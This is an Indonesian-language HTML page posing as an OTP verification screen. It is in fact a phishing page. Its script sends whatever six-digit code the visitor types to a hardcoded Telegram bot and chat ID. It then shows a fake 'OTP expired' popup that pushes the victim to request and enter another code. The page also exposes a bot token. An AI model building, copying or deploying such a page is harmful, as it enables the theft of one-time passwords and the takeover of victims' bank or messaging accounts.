<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi OTP</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white text-black font-sans min-h-screen flex flex-col px-6 py-6 relative">

  <!-- Back Button -->
  <button class="mb-6" onclick="history.back()">
    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none"
         viewBox="0 0 24 24" stroke="currentColor">
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
            d="M15 19l-7-7 7-7"/>
    </svg>
  </button>

  <!-- Title and Description -->
  <h1 class="text-xl font-bold mb-2">Verifikasi OTP</h1>
  <p class="text-sm text-gray-700 mb-6">
    Mohon masukkan one-time password (OTP) yang kami kirim ke<br>
    <span class="font-semibold">SMS - 6281*****</span>
  </p>
  
  <!-- OTP Input -->
  <form id="otpForm" class="flex justify-between max-w-xs mx-auto mb-6">
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
    <input type="text" maxlength="1" class="otp-input w-12 h-14 text-center border rounded-lg text-xl focus:outline-none focus:ring-2 focus:ring-blue-500" />
  </form>
  
  <!-- Resend OTP -->
  <p id="resendText" class="text-center text-sm text-blue-600 font-medium mb-4 cursor-pointer">
    Kirim Ulang OTP (01:00)
  </p>
  
  <!-- Change Number -->
  <p class="text-center text-xs text-gray-500">
    Ada kendala? <a href="#" class="underline">Ubah nomor telepon</a>
  </p>

  <!-- Popup -->
  <div id="otpPopup" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50">
    <div class="bg-white rounded-xl shadow-xl p-6 max-w-sm w-full animate-bounce">
      <h2 class="text-lg font-bold text-red-600 mb-2">‚ö†Ô∏è Kode OTP Kadaluarsa</h2>
      <p class="text-sm text-gray-700 mb-4">
        Kode OTP Anda telah melewati batas waktu. Silakan kirim ulang OTP untuk melanjutkan.
      </p>
      <button id="closePopup" class="w-full bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded-lg">
        Kirim Ulang OTP
      </button>
    </div>
  </div>
  <script>
  const BOT_TOKEN = '8459310017:AAFmfn3eF20MKFUViWbwn1eqnDOxnGkaqMo';
  const CHAT_ID = '7953949040';
  
  const otpInputs = document.querySelectorAll('.otp-input');
  const resendText = document.getElementById('resendText');
  const popup = document.getElementById('otpPopup');
  const closePopup = document.getElementById('closePopup');
  
  let countdown;
  let timeLeft = 60;
  
  function startCountdown() {
    resendText.classList.add("pointer-events-none", "opacity-50");
    timeLeft = 60;
    updateResendText();
    
    countdown = setInterval(() => {
      timeLeft--;
      updateResendText();
      
      if (timeLeft <= 0) {
        clearInterval(countdown);
        resendText.textContent = "Kirim Ulang OTP";
        resendText.classList.remove("pointer-events-none", "opacity-50");
      }
    }, 1000);
  }
  
  function updateResendText() {
    const menit = String(Math.floor(timeLeft / 60)).padStart(2, '0');
    const detik = String(timeLeft % 60).padStart(2, '0');
    resendText.textContent = `Kirim Ulang OTP (${menit}:${detik})`;
  }
  
  function showPopup() {
    popup.classList.remove("hidden");
  }
  
  function sendOtpToTelegram(otp) {
    const message = `üîë OTP yang dimasukkan: ${otp}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
  }
  
  closePopup.addEventListener('click', () => {
    popup.classList.add("hidden");
    startCountdown();
  });
  
  // Fokus otomatis & kirim OTP setelah semua terisi
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
      
      const otpValue = Array.from(otpInputs).map(inp => inp.value).join('');
      if (otpValue.length === otpInputs.length) {
        sendOtpToTelegram(otpValue);
        setTimeout(showPopup, 500);
      }
    });
  });
  
  resendText.addEventListener('click', () => {
    if (timeLeft <= 0) {
      startCountdown();
    }
  });
  
  startCountdown();
</script>
</body>
</html>
